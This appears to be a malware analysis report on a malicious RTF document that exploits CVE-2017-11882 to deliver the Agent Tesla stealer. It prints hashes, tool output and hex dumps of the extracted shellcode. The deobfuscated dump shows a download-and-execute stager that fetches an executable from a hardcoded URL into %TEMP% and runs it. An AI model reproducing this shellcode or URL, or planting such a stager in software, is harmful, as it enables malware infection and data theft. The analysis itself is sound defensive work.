# AgentTesla - RTF

---

This report analyzes a malicious **Rich Text Format (RTF)** document (SHA256: **`dfade43b170cbeefcb58db57df4095fb2c109f85af3dd6bc514cbf2a9d86b2b9`**) utilized as the initial delivery vector for the **Agent Tesla** information stealer. The document is engineered to exploit legacy vulnerabilities in the **Microsoft Equation Editor**—specifically **CVE-2017-11882**—to achieve Remote Code Execution (RCE) without requiring the victim to enable macros.

---

**`SAMPLE`**:https://bazaar.abuse.ch/browse.php?search=sha256%3Adfade43b170cbeefcb58db57df4095fb2c109f85af3dd6bc514cbf2a9d86b2b9

## **doc analysis**

---

### **File Identification & Hashes**

| **Property** | **Value** |
| --- | --- |
| File name | file.doc |
| **File Type** | Rich Text Format (RTF) |
| **Magic** | Rich Text Format data, version 1 |
| **File Size** | 7.18 KB (7356 bytes) |
| **MD5** | `a8cfd32e2bd9180b0b7bf1dcdc880f99` |
| **SHA-1** | `8e162cf763f149ac2d6436de1808df569a75f72b` |
| **SHA-256** | `dfade43b170cbeefcb58db57df4095fb2c109f85af3dd6bc514cbf2a9d86b2b9` |
| **Vhash** | `88dbadce1e2c7aea744a29f8290057bf0` |
| **SSDEEP** | `48:OVcoVYEENMxQcvWvnCAJcSYl+UaOhkoq/lfwdPiLwmv7vpE8IMh7BqlEMAZRgFlk:435vibc3ksoidKLHvxIMh74l31AzOi` |
| **TLSH** | `T14EE1F8B8924828B4F71BC8469CFEBEB49212F25F8ECE1684137DD1F50AB1B43AA43404` |
| **TrID** | Rich Text Format (83.3%), JSON object (generic) (16.6%) |
| **Magika** | RTF |
| **Packer/Indicator** | `objdata` |

---

**Description**

This document serves as the initial delivery mechanism in a multi-stage infection chain. Rather than using traditional macros, it utilizes an **obfuscated RTF structure** to deliver an embedded OLE object. This object is specifically crafted to exploit **CVE-2017-11882**, a memory corruption vulnerability in the legacy Microsoft Equation Editor (`EQNEDT32.EXE`).

**Magic bytes for RTF**

![Fig 1 - magic bytes RTF](AgentTesla%20-%20RTF/Screenshot_2026-02-06_at_11.26.31_AM.png)

Fig 1 - magic bytes RTF

---

### RTFOBJ

![Fig 2 - rtfobj output](AgentTesla%20-%20RTF/Screenshot_2026-02-06_at_12.02.48_PM.png)

Fig 2 - rtfobj output

---

One detail stands out here: the **class name** `b'UNRHH3sgDIOsfuxHe3nqhJL'`. This is a randomized, junk string used by the attacker to bypass simple signature-based detection that looks for the standard "Equation.3" string.

| **Property** | **Value** | **Significance** |
| --- | --- | --- |
| **Object ID** | 0 | This is the primary (and only) payload container. |
| **Data Size** | 3584 bytes | Large enough to hold a significant shellcode stage. |
| **CLSID** | **`0002CE02-0000-0000-C000-000000000046`** | Confirms the target is **`EQNEDT32.EXE`**. |
| **MD5** | **`2a7742a5cdbbc327ad4da55e459648b2`** | This is the hash of the extracted OLE stream, not the RTF itself. |

---

### **RTF Object Extraction**

Initial triage of the document structure using `rtfobj` revealed a single embedded OLE object targeting the legacy Microsoft Equation Editor.

![Fig 3 - Extracting ](AgentTesla%20-%20RTF/Screenshot_2026-02-06_at_12.07.44_PM.png)

Fig 3 - Extracting 

### **Data Carving**

The embedded stream was successfully extracted for further shellcode analysis.

- **Extracted File:** `file.doc_object_0000003E.bin`
- **Payload Size:** 3,584 bytes
- **Payload MD5:** `2a7742a5cdbbc327ad4da55e459648b2`

---

## `file.doc_object_0000003E.bin`

**Doc file magic bytes**

![Fig 4 - doc magic bytes](AgentTesla%20-%20RTF/Screenshot_2026-02-06_at_12.12.08_PM.png)

Fig 4 - doc magic bytes

---

### **Internal OLE Structure Analysis**

![Fig 5 - oledir analysis](AgentTesla%20-%20RTF/Screenshot_2026-02-06_at_12.13.53_PM.png)

Fig 5 - oledir analysis

---

| **Entry ID** | **Type** | **Name** | **Size (Bytes)** | **Description** |
| --- | --- | --- | --- | --- |
| **0** | Root | `Root Entry` | 1408 | The container for the OLE structure, tagged with CLSID **`0002CE02-0000-0000-C000-000000000046`** (Equation Editor). |
| **1** | Stream | `\x01Ole10Native` | **1355** | **The Primary Payload.** This stream contains the native data—in this case, the shellcode. |

---

- **The "\x01Ole10Native" Stream:** This is the most critical finding. In the context of CVE-2017-11882, the shellcode is wrapped inside this "Native" stream. The size (1355 bytes) is typical for a downloader shellcode that includes obfuscated URLs or fallback mechanisms.
- **CLSID Confirmation:** The `Root Entry` consistently carries the Equation Editor CLSID, reinforcing that the document's purpose is to trigger `EQNEDT32.EXE`.

---

### Oledump

![Fig 6 - oledump](AgentTesla%20-%20RTF/Screenshot_2026-02-06_at_12.46.28_PM.png)

Fig 6 - oledump

---

```c
FLARE-VM Fri 02/06/2026 12:13:42.48
C:\Users\redteam\Desktop\AgentTesla>oledump file.doc_object_0000003E.bin
  1:      1355 '\x01Ole10Native'

FLARE-VM Fri 02/06/2026 12:46:15.68
C:\Users\redteam\Desktop\AgentTesla>oledump -s 1 -d file.doc_object_0000003E.bin > nativeobj.bin

FLARE-VM Fri 02/06/2026 12:55:17.38
C:\Users\redteam\Desktop\AgentTesla>oledump -s 1 file.doc_object_0000003E.bin
00000000: 47 05 00 00 03 7E 01 EB  47 0A 01 05 7B 5B E7 EC  G....~..G...{[..
00000010: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
00000020: 00 00 00 00 00 00 00 00  00 50 06 45 00 00 00 00  .........P.E....
00000030: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
00000040: 00 00 00 00 00 00 00 00  00 29 C3 44 00 00 00 00  .........).D....
00000050: E8 07 00 00 00 EB 26 83  C1 04 EB 2F 59 81 C1 47  ......&..../Y..G
00000060: 02 00 00 90 EB 06 23 58  46 2A EE 23 8D A9 AF 02  ......#XF*.#....
00000070: 00 00 6B D2 00 69 D2 C5  CE C7 6F EB 04 EB DD EB  ..k..i....o.....
00000080: D6 81 C2 8F 1B DA 00 31  11 EB CC 39 E9 9C 52 57  .......1...9..RW
00000090: 8D 97 B8 70 00 00 81 EA  AE 22 00 00 5F 9C 50 50  ...p.....".._.PP
000000A0: 8D 80 76 52 00 00 2D D2  36 00 00 2D 1C 3B 00 00  ..vR..-.6..-.;..
000000B0: 58 58 9D 5A 9D 72 BE E9  E0 01 00 00 8F CD D5 F4  XX.Z.r..........
000000C0: 05 3E 3F E8 5D 62 81 E9  DC 3A 56 C3 7C EF 48 08  .>?.]b...:V.|.H.
000000D0: 2A 0F F5 4D 06 CB 52 70  A8 33 E3 CD 55 85 08 87  *..M..Rp.3..U...
000000E0: 4F 58 2D C4 03 EF 15 EC  59 6C 1A F2 EB 1B 66 84  OX-.....Yl....f.
000000F0: 43 A6 35 58 24 5C 20 6D  C3 74 4B 3D 0A 44 AF 0B  C.5X$\ m.tK=.D..
00000100: D6 89 61 1F 37 A4 C0 02  B4 D9 C3 C0 84 8F 38 31  ..a.7.........81
00000110: D7 94 FC 25 0E 57 44 BA  FC 2D D6 8E 2A 8D 4D 02  ...%.WD..-..*.M.
00000120: 19 54 5A 7C 76 03 FD A8  6A FD D2 B1 CC CC 40 8F  .TZ|v...j.....@.
00000130: 69 5B C7 32 44 39 3D D8  D1 DE 05 3E 38 DF 5F E8  i[.2D9=....>8._.
00000140: 9A 38 96 5A 45 8B 51 5D  FE 5C C3 43 41 53 FB 1D  .8.ZE.Q].\.CAS..
00000150: 78 7C 18 00 48 87 8A 48  C2 09 5B D1 B4 B9 66 40  x|..H..H..[...f@
00000160: D8 B5 99 37 1E BC 39 A5  EE 73 1C F7 63 A1 ED 5D  ...7..9..s..c..]
00000170: 84 74 6C 10 99 BC AD 87  53 2B 56 C4 1C 9D E1 88  .tl.....S+V.....
00000180: 52 4B E2 98 86 15 36 FF  BD C3 58 4B B1 39 93 CF  RK....6...XK.9..
00000190: 0D C7 47 E0 B6 5A 24 1A  FE C8 76 98 F1 09 52 42  ..G..Z$...v...RB
000001A0: 89 7A ED F9 F9 19 C9 E8  E7 CC FA BF AB 9C 70 F0  .z............p.
000001B0: 94 F2 25 F0 20 E2 72 7C  47 5E 3A CE B3 7F 39 EC  ..%. .r|G^:...9.
000001C0: FE C2 3F D9 FC 44 6F E3  F0 0F 81 D5 D4 45 00 43  ..?..Do......E.C
000001D0: 98 76 8A C2 59 D3 14 2E  AE 6D 23 E4 E1 7E 14 08  .v..Y....m#..~..
000001E0: 2F A2 57 BD 0A 19 AC 6E  55 09 6D 0C AA B8 C5 48  /.W....nU.m....H
000001F0: 97 D4 F4 D6 DD AB 8B B3  B1 74 B2 5B FD 86 65 13  .........t.[..e.
00000200: 9F 9B B2 1F A4 18 FD 0C  97 3D 3E E5 AC 74 40 7D  .........=>..t@}
00000210: 14 8A E2 AB 30 EF 55 89  D2 F5 64 B4 87 16 A9 92  ....0.U...d.....
00000220: C9 2F D3 84 4C BF E4 39  36 2B 75 DC 5C F9 EF 63  ./..L..96+u.\..c
00000230: 8F 19 D5 BF CD 19 F6 2F  8F 6F BE 6E FC AF 63 FF  ......./.o.n..c.
00000240: 33 DA 38 6A 82 8F DF 78  B0 51 90 77 39 C7 54 7A  3.8j...x.Q.w9.Tz
00000250: 85 02 4D 96 3A AE EC 25  69 61 3A 09 DF D2 12 E0  ..M.:..%ia:.....
00000260: 57 1F 62 50 C4 08 70 48  89 2F 10 31 C2 5F ED 41  W.bP..pH./.1._.A
00000270: 79 C4 CA AD F3 2B B8 EE  E1 4D 5C 03 AF FF 36 B0  y....+...M\...6.
00000280: BA 7D D2 B9 93 AA 14 28  40 47 74 8D 78 40 3D 3A  .}.....(@Gt.x@=:
00000290: EA DE CD 84 78 11 D8 08  76 B0 A5 E0 0E F7 B2 02  ....x...v.......
000002A0: 9A 62 EF 8A 11 E8 96 30  A4 3B EF DC C3 89 B1 8F  .b.....0.;......
000002B0: 9E 32 D5 4A 25 3D 01 83  08 61 34 7A B7 FE 19 21  .2.J%=...a4z...!
000002C0: 8A 6D A6 60 F9 6E F0 CD  48 2F 6A 6E 19 B5 04 5D  .m.`.n..H/jn...]
000002D0: B1 AB 35 DB 85 75 F9 86  99 56 49 A1 DF 9C 59 5E  ..5..u...VI...Y^
000002E0: 4F 31 34 33 8E 43 10 98  D0 04 C1 E2 60 4C 89 55  O143.C......`L.U
000002F0: C2 F1 D2 22 7C 34 DB 2A  18 38 C8 B8 7F E6 D9 05  ..."|4.*.8......
00000300: 96 75 7E 61 A0 F3 BF AF  51 DC 92 8C E8 9A 74 93  .u~a....Q.....t.
00000310: 18 2C D4 F3 5D 72 F5 F1  48 9A C8 74 2F 07 4A CC  .,..]r..H..t/.J.
00000320: B2 11 FD DF B1 E5 4C 91  C4 1E 72 A9 63 11 53 57  ......L...r.c.SW
00000330: BE F8 4C 2A C5 CC 21 C4  28 8E D9 73 57 37 68 B2  ..L*..!.(..sW7h.
00000340: 82 E5 FA 96 99 EC 81 C6  9C A3 29 10 0B 35 97 89  ..........)..5..
00000350: 74 C7 E4 4A 60 17 83 BB  5E 27 29 1F 80 34 B5 4C  t..J`...^')..4.L
00000360: 4A 5E E3 8C D3 7A 73 6B  A3 B4 15 95 D2 7C D6 BA  J^...zsk.....|..
00000370: 08 4E 90 A8 C2 1E 77 34  EE E0 63 5B A7 05 60 F1  .N....w4..c[..`.
00000380: 1E F4 E6 A1 69 63 C0 8A  5C 6D 84 68 5B D7 6D E3  ....ic..\m.h[.m.
00000390: 96 31 A4 34 FD 2F 5C 50  40 5B 31 54 CF CF 0C B2  .1.4./\P@[1T....
000003A0: DA E1 57 84 51 7C 7D D9  E4 53 9C F6 03 E2 8B DC  ..W.Q|}..S......
000003B0: DE A1 59 C0 65 14 61 DE  48 5D B6 DA F7 CC 72 D9  ..Y.e.a.H]....r.
000003C0: A2 02 B5 56 39 B6 58 F5  6C 1A D4 2C AB 72 8E 29  ...V9.X.l..,.r.)
000003D0: 26 6B 52 44 CD D6 D7 39  50 C8 12 1A 1F BF DF E9  &kRD...9P.......
000003E0: 6A 8D BA E5 F1 F5 B1 5F  48 0A 52 5D 53 95 ED 18  j......_H.R]S...
000003F0: 6E CE 9E 24 F5 89 06 50  DC E8 CA 49 47 2B 04 E7  n..$...P...IG+..
00000400: 32 8B 9A CB 2D 71 51 75  58 51 9A 2B FB F0 ED D1  2...-qQuXQ.+....
00000410: F2 63 AC A6 14 17 73 C8  60 AA BE A1 6F 1F 4C CE  .c....s.`...o.L.
00000420: FA 39 16 3F F1 43 8F 17  04 F3 74 60 74 BD 92 75  .9.?.C....t`t..u
00000430: FE 2B 97 E5 60 36 C4 0D  10 02 D9 F2 E3 3B 1C 94  .+..`6.......;..
00000440: 95 67 4E 33 0F 82 18 75  A4 E9 11 DF 19 F9 D3 0B  .gN3...u........
00000450: 4A 4D 8B 8A 28 9E CD 55  20 51 89 94 DA F3 F4 11  JM..(..U Q......
00000460: D9 1F E4 07 C1 0E 25 08  70 F8 B8 B4 F3 C1 79 46  ......%.p.....yF
00000470: DC E9 01 F8 D9 8E BD D4  32 CE 9C A3 93 59 67 ED  ........2....Yg.
00000480: 59 E0 72 B3 2C 76 F4 9B  17 EB 59 53 59 2C 21 21  Y.r.,v....YSY,!!
00000490: 5D 58 AC 05 B6 0C 94 EB  8F AE FB 5A 8A 36 F1 81  ]X.........Z.6..
000004A0: 7C BC 9B E6 B8 98 68 5E  45 DD 02 7B C0 22 25 AD  |.....h^E..{."%.
000004B0: 12 9D D0 52 E4 0F CD BB  0B 69 34 8B 3A EF 40 A3  ...R.....i4.:.@.
000004C0: C2 92 46 53 0D 6B 68 69  47 A7 D9 2F 00 78 CB 60  ..FS.khiG../.x.`
000004D0: 64 3B 39 C0 02 A0 3A C7  52 0A E3 5C 05 15 F4 1A  d;9...:.R..\....
000004E0: F9 1B C5 81 EA C3 BA 8A  BF E5 27 E7 D7 9C 61 E5  ..........'...a.
000004F0: AE 6D A0 09 FE 89 0B B2  C0 00 AC 3C B7 40 F3 36  .m.........<.@.6
00000500: 06 98 39 EF 42 A5 2D 95  35 16 D0 DF 4F D5 99 12  ..9.B.-.5...O...
00000510: 3F 7E 0D DD 2A CE DD 3E  06 03 76 2A F7 0F 29 FA  ?~..*..>..v*..).
00000520: CD F1 A2 9E 15 BD 29 08  F3 47 18 FA A3 12 C1 B3  ......)..G......
00000530: A6 B1 D5 51 44 01 00 27  2B 68 5E 7E 9E 88 E6 B6  ...QD..'+h^~....
00000540: C2 71 DF E8 46 AD FC 77  0E 43 60                 .q..F..w.C`

FLARE-VM Fri 02/06/2026 13:49:55.40
C:\Users\redteam\Desktop\AgentTesla>
```

---

Static analysis of the `nativeobj.bin` file identifies the MTEF (Math Type Equation Format) structure used to trigger the buffer overflow in `EQNEDT32.EXE`.

### Shellcode Micro-Analysis

### **Execution Flow**

The shellcode utilizes a multi-step initialization process to bypass static string detection:

1. **Instruction Redirection:** A short jump at the header redirects execution to the functional block at `0x50`.
2. **Position Independence:** At `0x50`, the shellcode executes an `E8` (CALL) instruction to perform a "GetPC" operation, allowing it to calculate relative offsets for its encrypted payload.
3. **Payload Decryption:** The data from `0x66` to `0x54A` appears to be the encrypted Stage 0.5 downloader. The shellcode likely contains a decryption loop (evident by the `EB` jumps and arithmetic operations like `81 C1` and `81 EA` seen in the hex).

### **Indicators of Obfuscation**

- **High Entropy:** The byte distribution in the `0x00000100` to `0x00000400` range shows no repeating patterns or plaintext, confirming heavy encryption.
- **Junk Code:** The presence of `90` (NOP) at `0x63` and various arithmetic "garbage" instructions are used to break signature-based detection.

---

### Shellcode Conversion & PE Reconstruction

```c
C:\Users\redteam\Desktop\AgentTesla>sclauncher -f=nativeobj.bin -pe -ep=0x50 -o=stage1.sc
  __________________ .____                               .__
 /   _____/\_   ___ \|    |   _____   __ __  ____   ____ |  |__   ___________
 \_____  \ /    \  \/|    |   \__  \ |  |  \/    \_/ ___\|  |  \_/ __ \_  __ \
 /        \\     \___|    |___ / __ \|  |  /   |  \  \___|   Y  \  ___/|  | \/
/_______  / \______  /_______ (____  /____/|___|  /\___  >___|  /\___  >__|
        \/         \/        \/    \/           \/     \/     \/     \/

Version: 0.0.6                                          www.thecyberyeti.com

[*] Producing a PE file, then exiting
[*] Adjusting shellcode entry point: +0x00000050

[*] Loading shellcode from path: nativeobj.bin
        [*] Found 1355 bytes of shellcode
        [~] Shellcode has entropy of 7.69

[PE] Done building PE file...created file stage1.sc
```

---

## First Stage Loader IDA Analysis - stage1.sc

---

![Fig 7 - IDA entry point E8 07 00 00 00](AgentTesla%20-%20RTF/Screenshot_2026-02-06_at_2.12.57_PM.png)

Fig 7 - IDA entry point E8 07 00 00 00

---

Some obfuscated code.

```nasm
.text:0040129C ; START OF FUNCTION CHUNK FOR sub_40105C
.text:0040129C
.text:0040129C loc_40129C:                             ; CODE XREF: sub_40105C+5B↑j
.text:0040129C                 push    cs
.text:0040129D                 div     dword ptr [edx-109D65FEh]
.text:004012A3                 mov     dl, [ecx]
.text:004012A5                 call    near ptr 3BE44340h
.text:004012AA                 out     dx, eax
.text:004012AB                 fadd    st(3), st
.text:004012AD                 mov     [ecx-2ACD6171h], esi
.text:004012B3                 dec     edx
.text:004012B4                 and     eax, 883013Dh
.text:004012B9                 popa
.text:004012BA                 xor     al, 7Ah
.text:004012BC                 mov     bh, 0FEh
.text:004012BE                 sbb     [ecx], esp
.text:004012C0                 mov     ch, [ebp-5Ah]
.text:004012C3                 pusha
.text:004012C4                 stc
.text:004012C5                 outsb
.text:004012C6                 lock int 48h            ; PCjr - Cordless Keyboard Translation
.text:004012C9                 das
.text:004012CA                 push    6Eh ; 'n'
.text:004012CC                 sbb     [ebp-544EA2FCh], esi
```

---

putting a break point. 

```nasm
.text:004010B7 E9 E0 01 00 00                jmp     loc_40129C
```

after some step over we got this.

### IDA hex

![Fig 8 - IDA hex deobfuscated data.](AgentTesla%20-%20RTF/Screenshot_2026-02-06_at_2.55.05_PM.png)

Fig 8 - IDA hex deobfuscated data.

---

### Shellcode Deconstruction

```nasm
47 05 00 00 03 7E 01 EB  47 0A 01 05 7B 5B E7 EC  G....~......{[..
00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
00 00 00 00 00 00 00 00  00 50 06 45 00 00 00 00  .........P.E....
00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
00 00 00 00 00 00 00 00  00 29 C3 44 00 00 00 00  .........)......
E8 07 00 00 00 EB 26 83  C1 04 EB 2F 59 81 C1 47  ................
02 00 00 90 EB 06 23 58  46 2A EE 23 8D A9 AF 02  .......XF*......
00 00 6B D2 00 69 D2 C5  CE C7 6F EB 04 EB DD EB  ..k..i....o.....
D6 81 C2 8F 1B DA 00 31  11 EB CC 39 E9 9C 52 57  ց .....1.......W
8D 97 B8 70 00 00 81 EA  AE 22 00 00 5F 9C 50 50  ...p........_.PP
8D 80 76 52 00 00 2D D2  36 00 00 2D 1C 3B 00 00  ..vR..-....-.;..
58 58 9D 5A 9D 72 BE E9  E0 01 00 00 8F CD D5 F4  XX.Z.r..........
05 3E 3F E8 5D 62 81 E9  DC 3A 56 C3 7C EF 48 08  .>?.......V.....
2A 0F F5 4D 06 CB 52 70  A8 33 E3 CD 55 85 08 87  *.....Rp.3......
4F 58 2D C4 03 EF 15 EC  59 6C 1A F2 EB 1B 66 84  OX-.....Yl......
43 A6 35 58 24 5C 20 6D  C3 74 4B 3D 0A 44 AF 0B  C.5X$\ m..K=.D..
D6 89 61 1F 37 A4 C0 02  B4 D9 C3 C0 84 8F 38 31  ։ a.7.........81
D7 94 FC 25 0E 57 44 BA  FC 2D D6 8E 2A 8D 4D 02  ה .%.WD..-֎ *.M.
19 54 5A 7C 76 03 FD A8  6A FD D2 B1 CC CC 40 8F  .TZ|v...j.ұ ..@.
69 5B C7 32 44 39 3D D8  D1 DE 05 3E 38 DF 5F E8  i[..D9=....>8...
9A 38 96 5A 45 8B 51 5D  FE 5C C3 43 41 53 FB 1D  .8.ZE.Q].\..AS..
78 7C 18 00 48 87 8A 48  C2 09 5B D1 B4 B9 66 40  x|..H..H..[Ѵ .f@
D8 B5 99 37 1E BC 39 A5  EE 73 1C F7 63 A1 ED 5D  ص .7..9........]
84 74 6C 10 99 BC AD 87  53 2B 56 C4 1C 9D E1 88  .tl.....S+V.....
52 4B E2 98 86 15 36 FF  BD C3 58 4B B1 39 93 CF  RK☆  .6....K.9..
0D C7 47 E0 B6 5A 24 1A  FE C8 76 98 F1 09 52 42  ......$.........
89 7A ED F9 F9 19 C9 E8  E7 CC FA BF AB 9C 70 F0  .z............p.
94 F2 25 F0 20 E2 72 7C  47 5E 3A CE B3 7F 39 EC  ........G^:γ .9.
FE C2 3F D9 FC 44 6F E3  F0 0F 81 D5 D4 45 00 43  .....Do......E.C
98 76 8A C2 59 D3 14 2E  AE 6D 23 E4 E1 7E 14 08  .v.......m#.....
2F A2 57 BD 0A 19 AC 6E  55 09 6D 0C AA B8 C5 48  /.W....nU.m.....
97 D4 F4 D6 DD AB 8B B3  B1 74 B2 5B FD 86 65 13  .........t.[..e.
9F 9B B2 1F A4 18 FD 0C  97 3D 3E E5 AC 74 40 7D  .........=>...@}
14 8A E2 AB 30 EF 55 89  D2 F5 64 B4 87 16 A9 92  ..........d.....
C9 2F D3 84 4C BF E4 39  36 2B 75 DC 5C F9 EF 63  ..ӄ L....+u.....
8F 19 D5 BF CD 19 F6 2F  8F 6F BE 6E FC AF 63 FF  ..տ .......n..c.
33 DA 38 6A 82 8F DF 78  B0 51 90 77 39 C7 54 7A  3..j.....Q.w9..z
85 02 4D 96 3A AE EC 25  69 61 3A 09 DF D2 12 E0  ..M.:....a:.....
57 1F 62 50 C4 08 70 48  89 2F 10 31 C2 5F ED 41  W.bP..pH./.1....
79 C4 CA AD F3 2B B8 EE  E1 4D 5C 03 AF FF 36 B0  y.............6.
BA 7D D2 B9 93 AA 14 28  40 47 74 8D 78 40 3D 3A  .}ҹ ...(@Gt.x@=:
EA DE CD 84 78 11 D8 08  76 B0 A5 E0 81 EC 68 02  ....x...v.....h.
00 00 E8 12 00 00 00 6B  00 65 00 72 00 6E 00 65  ......**.k.e.r.n.e
00 6C 00 33 00 32 00 00  00 E8 A9 01 00 00 89 C3  .l.3.2..........**
E8 0D 00 00 00 4C 6F 61  64 4C 69 62 72 61 72 79  .....**LoadLibrary
57 00 53 E8 08 02 00 00  89 C7 E8 0F 00 00 00 47  W.S............G
65 74 50 72 6F 63 41 64  64 72 65 73 73 00 53 E8  etProcAddress.S.**
**EC 01 00 00 89 C6 E8 1A  00 00 00 45 78 70 61 6E  ...........Expan
64 45 6E 76 69 72 6F 6E  6D 65 6E 74 53 74 72 69  dEnvironmentStri
6E 67 73 57 00 53 FF D6  68 04 01 00 00 8D 54 24  ngsW.S........T$
08 52 E8 20 00 00 00 25  00 54 00 45 00 4D 00 50  .R.....%.T.E.M.P
00 25 00 5C 00 6E 00 61  00 6D 00 65 00 2E 00 65  .%.\.n.a.m.e...e
00 78 00 65 00 00 00 FF  D0 E8 0E 00 00 00 55 00  .x.e..........U.
72 00 6C 00 4D 00 6F 00  6E 00 00 00 FF D7 E8 13  r.l.M.o.n.......**
00 00 00 55 52 4C 44 6F  77 6E 6C 6F 61 64 54 6F  ...**URLDownloadTo
46 69 6C 65 57 00 50 FF  D6 6A 00 6A 00 8D 54 24  FileW.P....j..T$
0C 52 E8 5A 00 00 00 68  00 74 00 74 00 70 00 3A  .R.....h.t.t.p.:
00 2F 00 2F 00 77 00 77  00 77 00 2E 00 67 00 72  ././.w.w.w...g.r
00 75 00 70 00 6F 00 64  00 75 00 6C 00 63 00 65  .u.p.o.d.u.l.c.e
00 6D 00 61 00 72 00 2E  00 70 00 65 00 2F 00 52  .m.a.r...p.e./.R
00 48 00 47 00 50 00 30  00 39 00 38 00 37 00 30  .H.G.P.0.9.8.7.0
00 39 00 30 00 30 00 2E  00 65 00 78 00 65 00 00  .9.0.0...e.x.e..**
00 6A 00 FF D0 89 FA 8D  BC 24 28 02 00 00 B9 0F  .j..Љ ...$(.....
00 00 00 31 C0 F3 AB C7  84 24 28 02 00 00 3C 00  ...1...Ǆ $(...<.
**00 00 8D 44 24 04 89 84  24 38 02 00 00 FF 84 24  ...D$...$8.....$
44 02 00 00 89 D7 E8 10  00 00 00 73 00 68 00 65  D..........s.h.e
00 6C 00 6C 00 33 00 32  00 00 00 FF D7 E8 10 00  .l.l.3.2........
00 00 53 68 65 6C 6C 45  78 65 63 75 74 65 45 78  ..ShellExecuteEx**
57 00 50 FF D6 8D 94 24  28 02 00 00 52 FF D0 E8  **W.P.֍ .$(...R...
0C 00 00 00 45 78 69 74  50 72 6F 63 65 73 73 00  ....ExitProcess.
53 FF D6 6A 00 FF D0 52  64 8B 15 30 00 00 00 8B  S.......d..0....**
52 0C 83 C2 0C 8B 12 8B  4A 30 51 FF 74 24 0C E8  R.......J0Q.t$..
0B 00 00 00 85 C0 74 ED  8B 42 18 5A C2 04 00 52  ...........Z...R
8B 4C 24 08 8B 54 24 0C  0F B6 01 66 85 C0 74 39  .L$..T$....f...9
66 3B 02 74 29 66 83 F8  61 72 06 66 83 F8 7A 76  f;.t)f..ar.f..zv
0C 66 83 F8 41 72 13 66  83 F8 5A 77 0D 66 83 F0  .f..Ar.f..Zw.f..
20 66 3B 02 74 02 EB 02  EB 04 31 C0 EB 0E 83 C1   f;.t.....1.....
02 83 C2 02 0F B6 01 EB  C2 83 C8 01 5A C2 08 00  ............Z...
53 52 56 57 8B 54 24 14  8B 42 3C 8D 44 02 78 8B  SRVW.T$..B<.D.x.
00 01 D0 50 8B 48 18 8B  58 20 01 D3 30 C0 85 C9  .....H..X ......
74 3D 51 8B 0B 8D 0C 11  89 CF 57 8B 74 24 24 31  t=Q.........t$$1
C9 49 F2 AE F7 D1 5F F3  A6 75 1D 59 58 2B 48 18  ......_....YX+H.
F7 D9 8B 58 24 01 D3 0F  B7 1C 4B 8B 40 1C 8D 04  ....$.....K.@...
98 8B 04 10 01 D0 EB 0C  83 C3 04 59 49 EB BF 31  ...........YI...
C0 83 C4 04 5F 5E 5A 5B  C2 08 00 84 00 00 00 00  ...._^Z[........
00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
```

---

The payload utilizes a custom API hashing/resolution routine to locate system functions in memory. Analysis of the deobfuscated strings at `0x004012C0` through `0x00401310` reveals the manual loading of the following libraries and functions:

The above code segment implements a **download-and-execute stager** It dynamically resolves Windows API functions, downloads a remote executable to the system’s temporary directory, executes it, and terminates.

---

### API Resolution

The malware is manually resolving Windows APIs to stay stealthy. You can see the strings used for `GetProcAddress` and `LoadLibrary` at these offsets:

- **`0x004012A7`**: `kernel32.dll` (Unicode/Wide: `k.e.r.n.e.l.3.2`)
- **`0x004012C5`**: `LoadLibraryW`
- **`0x004012DE`**: `GetProcAddress`
- **`0x004012FB`**: `ExpandEnvironmentStringsW`

---

### File Path Construction

At **`0x00401327`**, you see the malware building the path for the next stage:

- **String**: `%TEMP%\name.exe`
- **API Used**: `ExpandEnvironmentStringsW` (This takes the `%TEMP%` variable and turns it into a real path like `C:\Users\Admin\AppData\Local\Temp\name.exe`).

**Using the TEMP directory helps bypass permission restrictions and blend with normal system activity.**

---

### Network Activity

The sample contains a hardcoded Unicode URL:

```
http://www.grupodulcemar.pe/RHGP09870900.exe 
```

The malware downloads a secondary payload using:

```
URLDownloadToFileW
```

Downloaded file location:

```
%TEMP%\name.exe
```

**`This indicates second-stage payload retrieval from a remote server.`**

---

### **The "Kill Chain" (Download & Execute)**

This is the most critical part of your report. The hex dump shows the exact Command & Control (C2) server:

- **The Download API**: `URLDownloadToFileW` (Found at `0x00401363`).
- **The  URL**: `http[:]//www[.]grupodulcemar[.]pe/RHGP09870900.exe` (Found at **`0x00401387`**).
- **The Execution API**: `ShellExecuteExW` (Found at `0x00401432`).
- **The Cleanup**: `ExitProcess` (Found at `0x00401454`).

---

**`h = 68 starts at 00401380`** 

```nasm
00401380  0C 52 E8 5A 00 00 00 68  00 74 00 74 00 70 00 3A  .R.....h.t.t.p.:
```

**`00401380 + 7 =  00401387`** 

### **Why it starts at `00401387`**

1. The instruction starts at **`0x00401380`**.
2. The first 7 bytes of that block : `0C 52 E8 5A 00 00 00`.
3. The **8th byte** (at offset `+7`) is **`68`**.
4. Therefore, the new instruction `PUSH` starts at **`0x00401387`**.

---

### **`00401387`**

![Fig 9 - address **`00401387`**](AgentTesla%20-%20RTF/Screenshot_2026-02-06_at_5.07.57_PM.png)

Fig 9 - address **`00401387`**

---

**`goto 00401387` press d. select url data edit export data.**

![Fig 10 - url in ida](AgentTesla%20-%20RTF/Screenshot_2026-02-06_at_5.19.05_PM.png)

Fig 10 - url in ida

---

![Fig 11 - export data.](AgentTesla%20-%20RTF/Screenshot_2026-02-06_at_5.13.59_PM.png)

Fig 11 - export data.

### Cyberchef

![Fig 12 - cyberchef](AgentTesla%20-%20RTF/Screenshot_2026-02-06_at_5.17.25_PM.png)

Fig 12 - cyberchef

---